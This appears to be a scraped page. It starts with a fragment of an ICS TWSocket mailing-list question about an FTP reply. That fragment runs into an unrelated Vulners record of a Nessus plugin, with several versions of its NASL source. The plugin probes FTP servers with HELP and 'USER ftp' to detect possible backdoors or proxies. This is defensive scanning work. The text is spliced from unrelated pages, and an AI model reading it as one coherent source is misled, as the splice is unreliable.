LastResponse was : "200 PBSZ 0 successful"
No error
Is this a bug or I did something wrong.
By the way, OverbyteIcsV7 is used.
Thanks,
Robbert
--
To unsubscribe or change your settings for TWSocket mailing list
please goto http://lists.elists.org/cgi-bin/mailman/listinfo/twsocket
Visit our website at http://www.overbyte.be
[prev in list] [next in list] [prev in thread] [next in thread]
Configure |
About |
News |
Add a list |
Sponsored by KoreLogicFTP Server No Command Accepted (possible backdoor/proxy)
{"id": "FTPD_NO_CMD.NASL", "bulletinFamily": "scanner", "title": "FTP Server No Command Accepted (possible backdoor/proxy)", "description": "The remote server advertises itself as an FTP server, but it does not accept valid commands, which indicates that it may be a backdoor or a proxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.", "published": "2008-05-19T00:00:00", "modified": "2018-08-28T00:00:00", "cvss": {"score": 0.0, "vector": "NONE"}, "href": "https://www.tenable.com/plugins/index.php?view=single&id=32374", "reporter": "Tenable", "references": [], "cvelist": [], "type": "nessus", "lastseen": "2019-02-21T01:10:56", "history": [{"bulletin": {"bulletinFamily": "exploit", "cvelist": [], "cvss": {"score": 0.0, "vector": "NONE"}, "description": "The remote server advertises itself as an FTP server, but it does not accept valid commands, which indicates that it may be a backdoor or a proxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.", "edition": 1, "hash": "37a06d6ff6517a506f3a5e299770d6ece1f2d376252dd9045acd949a4d19d6af", "hashmap": [{"hash": "708697c63f7eb369319c6523380bdf7a", "key": "bulletinFamily"}, {"hash": "7cd402b26224f460136eb8c348721928", "key": "published"}, {"hash": "e37e72799cdab4e611dc2bdcaa9a6cc4", "key": "pluginID"}, {"hash": "8892bcbe1afe72e2eab98f586ca2f082", "key": "sourceData"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "references"}, {"hash": "56765472680401499c79732468ba4340", "key": "objectVersion"}, {"hash": "9cf00d658b687f030ebe173a0528c567", "key": "reporter"}, {"hash": "c728a49363c9a93a43a7e7f232b5a54a", "key": "naslFamily"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "cvelist"}, {"hash": "8cd4821cb504d25572038ed182587d85", "key": "cvss"}, {"hash": "07bffca2fe5a1f4640b94650e3477701", "key": "modified"}, {"hash": "0241dec868057b008f375a3182c43818", "key": "href"}, {"hash": "5e0bd03bec244039678f2b955a2595aa", "key": "type"}, {"hash": "45554920ec374edda3ef7dd1d54ba9ae", "key": "title"}, {"hash": "6e2584ec44637e50cf6be1498b4cb7e3", "key": "description"}], "history": [], "href": "https://www.tenable.com/plugins/index.php?view=single&id=32374", "id": "FTPD_NO_CMD.NASL", "lastseen": "2016-09-26T17:25:19", "modified": "2016-06-10T00:00:00", "naslFamily": "FTP", "objectVersion": "1.2", "pluginID": "32374", "published": "2008-05-19T00:00:00", "references": [], "reporter": "Tenable", "sourceData": "#\n# (C) Tenable Network Security, Inc.\n#\n\ninclude(\"compat.inc\");\n\nif(description)\n{\n script_id(32374);\n script_version (\"$Revision: 1.10 $\");\n script_name(english:\"FTP Server No Command Accepted (possible backdoor/proxy)\");\n\n script_set_attribute(attribute:\"synopsis\", value:\n\"The remote FTP service is not working properly.\");\n script_set_attribute(attribute:\"description\", value:\n\"The remote server advertises itself as an FTP server, but it does not\naccept valid commands, which indicates that it may be a backdoor or a\nproxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.\" );\n script_set_attribute(attribute:\"risk_factor\", value: \"None\" );\n script_set_attribute(attribute:\"solution\", value: \"n/a\" );\n script_set_attribute(attribute:\"plugin_publication_date\", value: \"2008/05/19\");\n script_cvs_date(\"$Date: 2016/06/10 20:42:51 $\");\n script_set_attribute(attribute:\"plugin_type\", value:\"remote\");\n script_end_attributes();\n\n\t\t \n script_summary(english: \"Checks that the FTP server accepts common commands\");\n script_category(ACT_GATHER_INFO);\n script_family(english: \"FTP\");\n script_copyright(english: \"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.\");\n\n script_dependencie(\"find_service_3digits.nasl\", \"doublecheck_std_services.nasl\", \"logins.nasl\");\n script_require_ports(\"Services/ftp\", 21);\n script_require_keys(\"Settings/ExperimentalScripts\");\n exit(0);\n}\n\n#\ninclude('global_settings.inc');\ninclude('misc_func.inc');\ninclude('ftp_func.inc');\n\nif (! experimental_scripts)\n exit(0);\n\nlogin = get_kb_item(\"ftp/login\");\npass = get_kb_item(\"ftp/password\");\n# if (! login) login = \"anonymous\";\n# if (! pass) pass = \"bounce@nessus.org\";\n\nport = get_ftp_port(default: 21);\n\nsoc = open_sock_tcp(port);\nif (! soc) exit(0);\n\nr = ftp_recv_line(socket: soc, retry: 3);\nif (! r)\n{\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n## set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/no_banner', value: TRUE);\n
ftp_close(socket: soc);\n
return NULL;\n}\ndebug_print(level: 2, 'Banner = ', r);\n\nif (r =~ '^[45][0-9][0-9] ' || \n
match(string: r, pattern: 'Access denied*', icase: 1))\n{\n
set_kb_item(name: 'ftp/'+port+'/denied', value: TRUE);\n
ftp_close(socket: soc);\n
exit(0, strcat('FTP server on port ', port, ' is closed'));\n}\n\nforeach cmd (make_list(\"HELP\", \"USER ftp\"))\n# Not QUIT, as some servers close the connection without a 2xx code\n{\n send(socket: soc, data: cmd + '\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 3);\n\n # Avoid FP on FTPS\n if (r =~ \"^550[ -]SSL/TLS required\")\n {\n
set_kb_item(name: 'ftp/'+port+'/TLS', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\t# Temporary\n
close(soc);\n
exit(0, \"This is an FTPS server\");\n }\n\n if (r !~ '[1-5][0-9][0-9][ -]')\n {\n
debug_print('FTP server on port ', port, ' answer to ', cmd, ': ', r);\n
security_note(port: port);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
close(soc);\n
exit(0);\n }\n debug_print(level:2, 'FTP server on port ', port, ' answer to ', cmd, ': ', r);\n}\n\nclose(soc);\n", "title": "FTP Server No Command Accepted (possible backdoor/proxy)", "type": "nessus", "viewCount": 0}, "differentElements": ["modified", "sourceData"], "edition": 1, "lastseen": "2016-09-26T17:25:19"}, {"bulletin": {"bulletinFamily": "scanner", "cpe": [], "cvelist": [], "cvss": {"score": 0.0, "vector": "NONE"}, "description": "The remote server advertises itself as an FTP server, but it does not accept valid commands, which indicates that it may be a backdoor or a proxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.", "edition": 2, "enchantments": {"score": {"value": 5.0, "vector": "NONE"}}, "hash": "4c8e9f8c23ae98068e260666364b71876fd460d0db9b5ffdcd13db1ec06805fc", "hashmap": [{"hash": "7cd402b26224f460136eb8c348721928", "key": "published"}, {"hash": "e37e72799cdab4e611dc2bdcaa9a6cc4", "key": "pluginID"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "references"}, {"hash": "9cf00d658b687f030ebe173a0528c567", "key": "reporter"}, {"hash": "c728a49363c9a93a43a7e7f232b5a54a", "key": "naslFamily"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "cvelist"}, {"hash": "8cd4821cb504d25572038ed182587d85", "key": "cvss"}, {"hash": "0241dec868057b008f375a3182c43818", "key": "href"}, {"hash": "bbdaea376f500d25f6b0c1050311dd07", "key": "bulletinFamily"}, {"hash": "5e0bd03bec244039678f2b955a2595aa", "key": "type"}, {"hash": "45554920ec374edda3ef7dd1d54ba9ae", "key": "title"}, {"hash": "b5348bdaf143de7f1627a4373bd7d0b0", "key": "modified"}, {"hash": "7b3e00a3028b7cb23e300463080c1b8e", "key": "sourceData"}, {"hash": "6e2584ec44637e50cf6be1498b4cb7e3", "key": "description"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "cpe"}], "history": [], "href": "https://www.tenable.com/plugins/index.php?view=single&id=32374", "id": "FTPD_NO_CMD.NASL", "lastseen": "2017-02-03T21:02:59", "modified": "2017-02-03T00:00:00", "naslFamily": "FTP", "objectVersion": "1.2", "pluginID": "32374", "published": "2008-05-19T00:00:00", "references": [], "reporter": "Tenable", "sourceData": "#\n# (C) Tenable Network Security, Inc.\n#\n\ninclude(\"compat.inc\");\n\nif(description)\n{\n script_id(32374);\n script_version (\"$Revision: 1.11 $\");\n script_name(english:\"FTP Server No Command Accepted (possible backdoor/proxy)\");\n\n script_set_attribute(attribute:\"synopsis\", value:\n\"The remote FTP service is not working properly.\");\n script_set_attribute(attribute:\"description\", value:\n\"The remote server advertises itself as an FTP server, but it does not\naccept valid commands, which indicates that it may be a backdoor or a\nproxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.\" );\n script_set_attribute(attribute:\"risk_factor\", value: \"None\" );\n script_set_attribute(attribute:\"solution\", value: \"n/a\" );\n script_set_attribute(attribute:\"plugin_publication_date\", value: \"2008/05/19\");\n script_cvs_date(\"$Date: 2017/02/03 16:29:56 $\");\n script_set_attribute(attribute:\"plugin_type\", value:\"remote\");\n script_end_attributes();\n\n script_summary(english: \"Checks that the FTP server accepts common commands\");\n script_category(ACT_GATHER_INFO);\n script_family(english: \"FTP\");\n script_copyright(english: \"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.\");\n\n script_dependencie(\"find_service_3digits.nasl\", \"doublecheck_std_services.nasl\", \"logins.nasl\");\n script_require_ports(\"Services/ftp\", 21);\n script_require_keys(\"Settings/ExperimentalScripts\");\n exit(0);\n}\n\n#\ninclude('audit.inc');\ninclude('global_settings.inc');\ninclude('misc_func.inc');\ninclude('ftp_func.inc');\n\nif (! experimental_scripts)\n exit(0);\n\nlogin = get_kb_item(\"ftp/login\");\npass = get_kb_item(\"ftp/password\");\n# if (! login) login = \"anonymous\";\n# if (! pass) pass = \"bounce@nessus.org\";\n\nport = get_ftp_port(default: 21);\n\nsoc = open_sock_tcp(port);\nif (! soc) audit(AUDIT_SOCK_FAIL, port);\n\nr = ftp_recv_line(socket: soc, retry: 3);\nif (! r)\n{\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n## set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/no_banner', value: TRUE);\n
ftp_close(socket: soc);\n
audit(AUDIT_NO_BANNER, port);\n}\ndebug_print(level: 2, 'Banner = ', r);\n\nif (r =~ '^[45][0-9][0-9] ' ||\n
match(string: r, pattern: 'Access denied*', icase: 1))\n{\n
set_kb_item(name: 'ftp/'+port+'/denied', value: TRUE);\n
ftp_close(socket: soc);\n
exit(0, 'FTP server on port '+ port + ' is closed');\n}\n\nforeach cmd (make_list(\"HELP\", \"USER ftp\"))\n# Not QUIT, as some servers close the connection without a 2xx code\n{\n send(socket: soc, data: cmd + '\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 3);\n\n # Avoid FP on FTPS\n if (r =~ \"^550[ -]SSL/TLS required\")\n {\n
set_kb_item(name: 'ftp/'+port+'/TLS', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);# Temporary\n
close(soc);\n
exit(0, \"This is an FTPS server\");\n }\n\n if (r !~ '[1-5][0-9][0-9][ -]')\n {\n
debug_print('FTP server on port ', port, ' answer to ', cmd, ': ', r);\n
security_note(port: port);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
close(soc);\n
exit(0);\n }\n debug_print(level:2, 'FTP server on port ', port, ' answer to ', cmd, ': ', r);\n}\n\nclose(soc);\n", "title": "FTP Server No Command Accepted (possible backdoor/proxy)", "type": "nessus", "viewCount": 2}, "differentElements": ["modified", "sourceData"], "edition": 2, "lastseen": "2017-02-03T21:02:59"}, {"bulletin": {"bulletinFamily": "scanner", "cpe": [], "cvelist": [], "cvss": {"score": 0.0, "vector": "NONE"}, "description": "The remote server advertises itself as an FTP server, but it does not\naccept valid commands, which indicates that it may be a backdoor or a\nproxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.", "edition": 4, "enchantments": {"dependencies": {"modified": "2019-01-16T20:08:20", "references": [{"idList": ["FTPD_BAD_SEQUENCE.NASL", "FTPSERVER_DETECT_TYPE_ND_VERSION.NASL"], "type": "nessus"}, {"idList": ["OPENVAS:136141256231080064", "OPENVAS:136141256231080063", "OPENVAS:136141256231010092", "OPENVAS:80063"], "type": "openvas"}]}, "score": {"value": 5.0, "vector": "NONE"}}, "hash": "0eff8130def7479b16ac4d4c26c7d753dea0d94746ded248ff8ac6f3a232671a", "hashmap": [{"hash": "ef2eddd75c4987cd7e01b6d35c4acc66", "key": "sourceData"}, {"hash": "7cd402b26224f460136eb8c348721928", "key": "published"}, {"hash": "de954e5faf81a056ee1ffc686de5ea45", "key": "modified"}, {"hash": "e37e72799cdab4e611dc2bdcaa9a6cc4", "key": "pluginID"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "references"}, {"hash": "9cf00d658b687f030ebe173a0528c567", "key": "reporter"}, {"hash": "4a201eacfda420d146250c13b5502b82", "key": "description"}, {"hash": "c728a49363c9a93a43a7e7f232b5a54a", "key": "naslFamily"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "cvelist"}, {"hash": "8cd4821cb504d25572038ed182587d85", "key": "cvss"}, {"hash": "0241dec868057b008f375a3182c43818", "key": "href"}, {"hash": "bbdaea376f500d25f6b0c1050311dd07", "key": "bulletinFamily"}, {"hash": "5e0bd03bec244039678f2b955a2595aa", "key": "type"}, {"hash": "45554920ec374edda3ef7dd1d54ba9ae", "key": "title"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "cpe"}], "history": [], "href": "https://www.tenable.com/plugins/index.php?view=single&id=32374", "id": "FTPD_NO_CMD.NASL", "lastseen": "2019-01-16T20:08:20", "modified": "2018-08-28T00:00:00", "naslFamily": "FTP", "objectVersion": "1.3", "pluginID": "32374", "published": "2008-05-19T00:00:00", "references": [], "reporter": "Tenable", "sourceData": "#\n# (C) Tenable Network Security, Inc.\n#\n\ninclude(\"compat.inc\");\n\nif(description)\n{\n script_id(32374);\n script_version (\"1.12\");\n script_name(english:\"FTP Server No Command Accepted (possible backdoor/proxy)\");\n\n script_set_attribute(attribute:\"synopsis\", value:\n\"The remote FTP service is not working properly.\");\n script_set_attribute(attribute:\"description\", value:\n\"The remote server advertises itself as an FTP server, but it does not\naccept valid commands, which indicates that it may be a backdoor or a\nproxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.\" );\n script_set_attribute(attribute:\"risk_factor\", value: \"None\" );\n script_set_attribute(attribute:\"solution\", value: \"n/a\" );\n script_set_attribute(attribute:\"plugin_publication_date\", value: \"2008/05/19\");\n script_cvs_date(\"Date: 2018/08/28 16:07:20\");\n script_set_attribute(attribute:\"plugin_type\", value:\"remote\");\n script_end_attributes();\n\n script_summary(english: \"Checks that the FTP server accepts common commands\");\n script_category(ACT_GATHER_INFO);\n script_family(english: \"FTP\");\n script_copyright(english: \"This script is Copyright (C) 2008-2018 and is owned by Tenable, Inc. or an Affiliate thereof.\");\n\n script_dependencies(\"find_service_3digits.nasl\", \"doublecheck_std_services.nasl\", \"logins.nasl\");\n script_require_ports(\"Services/ftp\", 21);\n script_require_keys(\"Settings/ExperimentalScripts\");\n exit(0);\n}\n\n#\ninclude('audit.inc');\ninclude('global_settings.inc');\ninclude('misc_func.inc');\ninclude('ftp_func.inc');\n\nif (! experimental_scripts)\n exit(0);\n\nlogin = get_kb_item(\"ftp/login\");\npass = get_kb_item(\"ftp/password\");\n# if (! login) login = \"anonymous\";\n# if (! pass) pass = \"bounce@nessus.org\";\n\nport = get_ftp_port(default: 21);\n\nsoc = open_sock_tcp(port);\nif (! soc) audit(AUDIT_SOCK_FAIL, port);\n\nftp_debug(str:\"custom banner\");\nr = ftp_recv_line(socket: soc, retry: 3);\nif (! r)\n{\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n## set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/no_banner', value: TRUE);\n
ftp_close(socket: soc);\n
audit(AUDIT_NO_BANNER, port);\n}\ndebug_print(level: 2, 'Banner = ', r);\n\nif (r =~ '^[45][0-9][0-9] ' ||\n
match(string: r, pattern: 'Access denied*', icase: 1))\n{\n
set_kb_item(name: 'ftp/'+port+'/denied', value: TRUE);\n
ftp_close(socket: soc);\n
exit(0, 'FTP server on port '+ port + ' is closed');\n}\n\nforeach cmd (make_list(\"HELP\", \"USER ftp\"))\n# Not QUIT, as some servers close the connection without a 2xx code\n{\n send(socket: soc, data: cmd + '\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 3);\n\n # Avoid FP on FTPS\n if (r =~ \"^550[ -]SSL/TLS required\")\n {\n
set_kb_item(name: 'ftp/'+port+'/TLS', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);# Temporary\n
close(soc);\n
exit(0, \"This is an FTPS server\");\n }\n\n if (r !~ '[1-5][0-9][0-9][ -]')\n {\n
debug_print('FTP server on port ', port, ' answer to ', cmd, ': ', r);\n
security_note(port: port);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
close(soc);\n
exit(0);\n }\n debug_print(level:2, 'FTP server on port ', port, ' answer to ', cmd, ': ', r);\n}\n\nclose(soc);\n", "title": "FTP Server No Command Accepted (possible backdoor/proxy)", "type": "nessus", "viewCount": 8}, "differentElements": ["description"], "edition": 4, "lastseen": "2019-01-16T20:08:20"}, {"bulletin": {"bulletinFamily": "scanner", "cpe": [], "cvelist": [], "cvss": {"score": 0.0, "vector": "NONE"}, "description": "The remote server advertises itself as an FTP server, but it does not accept valid commands, which indicates that it may be a backdoor or a proxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.", "edition": 3, "enchantments": {"score": {"value": 5.0, "vector": "NONE"}}, "hash": "5ed2295b42bfc011fab04eeb57c11fbce15966bdb397fa29419a8ed0ca474638", "hashmap": [{"hash": "ef2eddd75c4987cd7e01b6d35c4acc66", "key": "sourceData"}, {"hash": "7cd402b26224f460136eb8c348721928", "key": "published"}, {"hash": "de954e5faf81a056ee1ffc686de5ea45", "key": "modified"}, {"hash": "e37e72799cdab4e611dc2bdcaa9a6cc4", "key": "pluginID"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "references"}, {"hash": "9cf00d658b687f030ebe173a0528c567", "key": "reporter"}, {"hash": "c728a49363c9a93a43a7e7f232b5a54a", "key": "naslFamily"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "cvelist"}, {"hash": "8cd4821cb504d25572038ed182587d85", "key": "cvss"}, {"hash": "0241dec868057b008f375a3182c43818", "key": "href"}, {"hash": "bbdaea376f500d25f6b0c1050311dd07", "key": "bulletinFamily"}, {"hash": "5e0bd03bec244039678f2b955a2595aa", "key": "type"}, {"hash": "45554920ec374edda3ef7dd1d54ba9ae", "key": "title"}, {"hash": "6e2584ec44637e50cf6be1498b4cb7e3", "key": "description"}, {"hash": "d41d8cd98f00b204e9800998ecf8427e", "key": "cpe"}], "history": [], "href": "https://www.tenable.com/plugins/index.php?view=single&id=32374", "id": "FTPD_NO_CMD.NASL", "lastseen": "2018-08-29T11:52:02", "modified": "2018-08-28T00:00:00", "naslFamily": "FTP", "objectVersion": "1.3", "pluginID": "32374", "published": "2008-05-19T00:00:00", "references": [], "reporter": "Tenable", "sourceData": "#\n# (C) Tenable Network Security, Inc.\n#\n\ninclude(\"compat.inc\");\n\nif(description)\n{\n script_id(32374);\n script_version (\"1.12\");\n script_name(english:\"FTP Server No Command Accepted (possible backdoor/proxy)\");\n\n script_set_attribute(attribute:\"synopsis\", value:\n\"The remote FTP service is not working properly.\");\n script_set_attribute(attribute:\"description\", value:\n\"The remote server advertises itself as an FTP server, but it does not\naccept valid commands, which indicates that it may be a backdoor or a\nproxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.\" );\n script_set_attribute(attribute:\"risk_factor\", value: \"None\" );\n script_set_attribute(attribute:\"solution\", value: \"n/a\" );\n script_set_attribute(attribute:\"plugin_publication_date\", value: \"2008/05/19\");\n script_cvs_date(\"Date: 2018/08/28 16:07:20\");\n script_set_attribute(attribute:\"plugin_type\", value:\"remote\");\n script_end_attributes();\n\n script_summary(english: \"Checks that the FTP server accepts common commands\");\n script_category(ACT_GATHER_INFO);\n script_family(english: \"FTP\");\n script_copyright(english: \"This script is Copyright (C) 2008-2018 and is owned by Tenable, Inc. or an Affiliate thereof.\");\n\n script_dependencies(\"find_service_3digits.nasl\", \"doublecheck_std_services.nasl\", \"logins.nasl\");\n script_require_ports(\"Services/ftp\", 21);\n script_require_keys(\"Settings/ExperimentalScripts\");\n exit(0);\n}\n\n#\ninclude('audit.inc');\ninclude('global_settings.inc');\ninclude('misc_func.inc');\ninclude('ftp_func.inc');\n\nif (! experimental_scripts)\n exit(0);\n\nlogin = get_kb_item(\"ftp/login\");\npass = get_kb_item(\"ftp/password\");\n# if (! login) login = \"anonymous\";\n# if (! pass) pass = \"bounce@nessus.org\";\n\nport = get_ftp_port(default: 21);\n\nsoc = open_sock_tcp(port);\nif (! soc) audit(AUDIT_SOCK_FAIL, port);\n\nftp_debug(str:\"custom banner\");\nr = ftp_recv_line(socket: soc, retry: 3);\nif (! r)\n{\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n## set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/no_banner', value: TRUE);\n
ftp_close(socket: soc);\n
audit(AUDIT_NO_BANNER, port);\n}\ndebug_print(level: 2, 'Banner = ', r);\n\nif (r =~ '^[45][0-9][0-9] ' ||\n
match(string: r, pattern: 'Access denied*', icase: 1))\n{\n
set_kb_item(name: 'ftp/'+port+'/denied', value: TRUE);\n
ftp_close(socket: soc);\n
exit(0, 'FTP server on port '+ port + ' is closed');\n}\n\nforeach cmd (make_list(\"HELP\", \"USER ftp\"))\n# Not QUIT, as some servers close the connection without a 2xx code\n{\n send(socket: soc, data: cmd + '\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 3);\n\n # Avoid FP on FTPS\n if (r =~ \"^550[ -]SSL/TLS required\")\n {\n
set_kb_item(name: 'ftp/'+port+'/TLS', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);# Temporary\n
close(soc);\n
exit(0, \"This is an FTPS server\");\n }\n\n if (r !~ '[1-5][0-9][0-9][ -]')\n {\n
debug_print('FTP server on port ', port, ' answer to ', cmd, ': ', r);\n
security_note(port: port);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
close(soc);\n
exit(0);\n }\n debug_print(level:2, 'FTP server on port ', port, ' answer to ', cmd, ': ', r);\n}\n\nclose(soc);\n", "title": "FTP Server No Command Accepted (possible backdoor/proxy)", "type": "nessus", "viewCount": 8}, "differentElements": ["description"], "edition": 3, "lastseen": "2018-08-29T11:52:02"}], "edition": 5, "hashmap": [{"key": "bulletinFamily", "hash": "bbdaea376f500d25f6b0c1050311dd07"}, {"key": "cpe", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "6e2584ec44637e50cf6be1498b4cb7e3"}, {"key": "href", "hash": "0241dec868057b008f375a3182c43818"}, {"key": "modified", "hash": "de954e5faf81a056ee1ffc686de5ea45"}, {"key": "naslFamily", "hash": "c728a49363c9a93a43a7e7f232b5a54a"}, {"key": "pluginID", "hash": "e37e72799cdab4e611dc2bdcaa9a6cc4"}, {"key": "published", "hash": "7cd402b26224f460136eb8c348721928"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "9cf00d658b687f030ebe173a0528c567"}, {"key": "sourceData", "hash": "ef2eddd75c4987cd7e01b6d35c4acc66"}, {"key": "title", "hash": "45554920ec374edda3ef7dd1d54ba9ae"}, {"key": "type", "hash": "5e0bd03bec244039678f2b955a2595aa"}], "hash": "5ed2295b42bfc011fab04eeb57c11fbce15966bdb397fa29419a8ed0ca474638", "viewCount": 12, "enchantments": {"dependencies": {"references": [{"type": "openvas", "idList": ["OPENVAS:136141256231080064", "OPENVAS:80063", "OPENVAS:136141256231080063", "OPENVAS:136141256231010092"]}, {"type": "nessus", "idList": ["FTPD_BAD_SEQUENCE.NASL", "FTPSERVER_DETECT_TYPE_ND_VERSION.NASL"]}], "modified": "2019-02-21T01:10:56"}, "score": {"value": 0.3, "vector": "NONE", "modified": "2019-02-21T01:10:56"}, "vulnersScore": 0.3}, "objectVersion": "1.3", "sourceData": "#\n# (C) Tenable Network Security, Inc.\n#\n\ninclude(\"compat.inc\");\n\nif(description)\n{\n script_id(32374);\n script_version (\"1.12\");\n script_name(english:\"FTP Server No Command Accepted (possible backdoor/proxy)\");\n\n script_set_attribute(attribute:\"synopsis\", value:\n\"The remote FTP service is not working properly.\");\n script_set_attribute(attribute:\"description\", value:\n\"The remote server advertises itself as an FTP server, but it does not\naccept valid commands, which indicates that it may be a backdoor or a\nproxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.\" );\n script_set_attribute(attribute:\"risk_factor\", value: \"None\" );\n script_set_attribute(attribute:\"solution\", value: \"n/a\" );\n script_set_attribute(attribute:\"plugin_publication_date\", value: \"2008/05/19\");\n script_cvs_date(\"Date: 2018/08/28 16:07:20\");\n script_set_attribute(attribute:\"plugin_type\", value:\"remote\");\n script_end_attributes();\n\n script_summary(english: \"Checks that the FTP server accepts common commands\");\n script_category(ACT_GATHER_INFO);\n script_family(english: \"FTP\");\n script_copyright(english: \"This script is Copyright (C) 2008-2018 and is owned by Tenable, Inc. or an Affiliate thereof.\");\n\n script_dependencies(\"find_service_3digits.nasl\", \"doublecheck_std_services.nasl\", \"logins.nasl\");\n script_require_ports(\"Services/ftp\", 21);\n script_require_keys(\"Settings/ExperimentalScripts\");\n exit(0);\n}\n\n#\ninclude('audit.inc');\ninclude('global_settings.inc');\ninclude('misc_func.inc');\ninclude('ftp_func.inc');\n\nif (! experimental_scripts)\n exit(0);\n\nlogin = get_kb_item(\"ftp/login\");\npass = get_kb_item(\"ftp/password\");\n# if (! login) login = \"anonymous\";\n# if (! pass) pass = \"bounce@nessus.org\";\n\nport = get_ftp_port(default: 21);\n\nsoc = open_sock_tcp(port);\nif (! soc) audit(AUDIT_SOCK_FAIL, port);\n\nftp_debug(str:\"custom banner\");\nr = ftp_recv_line(socket: soc, retry: 3);\nif (! r)\n{\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n## set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/no_banner', value: TRUE);\n
ftp_close(socket: soc);\n
audit(AUDIT_NO_BANNER, port);\n}\ndebug_print(level: 2, 'Banner = ', r);\n\nif (r =~ '^[45][0-9][0-9] ' ||\n
match(string: r, pattern: 'Access denied*', icase: 1))\n{\n
set_kb_item(name: 'ftp/'+port+'/denied', value: TRUE);\n
ftp_close(socket: soc);\n
exit(0, 'FTP server on port '+ port + ' is closed');\n}\n\nforeach cmd (make_list(\"HELP\", \"USER ftp\"))\n# Not QUIT, as some servers close the connection without a 2xx code\n{\n send(socket: soc, data: cmd + '\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 3);\n\n # Avoid FP on FTPS\n if (r =~ \"^550[ -]SSL/TLS required\")\n {\n
set_kb_item(name: 'ftp/'+port+'/TLS', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);# Temporary\n
close(soc);\n
exit(0, \"This is an FTPS server\");\n }\n\n if (r !~ '[1-5][0-9][0-9][ -]')\n {\n
debug_print('FTP server on port ', port, ' answer to ', cmd, ': ', r);\n
security_note(port: port);\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
close(soc);\n
exit(0);\n }\n debug_print(level:2, 'FTP server on port ', port, ' answer to ', cmd, ': ', r);\n}\n\nclose(soc);\n", "naslFamily": "FTP", "pluginID": "32374", "cpe": [], "scheme": null}
{"openvas": [{"lastseen": "2018-08-24T21:13:09", "bulletinFamily": "scanner", "description": "The remote FTP service is not working properly", "modified": "2018-08-17T00:00:00", "published": "2008-10-24T00:00:00", "id": "OPENVAS:136141256231080064", "href": "http://plugins.openvas.org/nasl.php?oid=136141256231080064", "title": "Fake FTP server does not accept any command", "type": "openvas", "sourceData": "###############################################################################\n# OpenVAS Vulnerability Test\n# $Id: ftpd_no_cmd.nasl 11018 2018-08-17 07:13:05Z cfischer $\n#\n# Fake FTP server does not accept any command\n#\n# Authors:\n# Michel Arboi <mikhail@nessus.org>\n#\n# Copyright:\n# Copyright (C) 2008 Michel Arboi\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License version 2,\n# as published by the Free Software Foundation\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.\n###############################################################################\n\nif(description)\n{\n
script_oid(\"1.3.6.1.4.1.25623.1.0.80064\");\n
script_tag(name:\"cvss_base_vector\", value:\"AV:N/AC:L/Au:N/C:N/I:N/A:N\");\n
script_version(\"$Revision: 11018 $\");\n
script_tag(name:\"last_modification\", value:\"$Date: 2018-08-17 09:13:05 +0200 (Fri, 17 Aug 2018) $\");\n
